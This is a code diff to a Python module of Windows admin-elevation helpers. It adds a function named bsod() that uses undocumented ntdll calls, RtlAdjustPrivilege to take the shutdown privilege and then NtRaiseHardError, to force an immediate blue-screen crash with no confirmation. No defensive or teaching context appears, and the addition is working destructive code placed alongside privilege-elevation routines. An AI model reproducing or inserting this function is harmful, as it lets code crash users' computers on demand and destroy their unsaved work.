@@ -1,5 +1,5 @@
 import ctypes
-
+from ctypes import *
 
 def run_as_admin(cmd):
     # Define the ShellExecuteEx function
@@ -51,4 +51,9 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
+
+def bsod():
+    nullptr = POINTER(c_int)()
+    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
+    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))
 
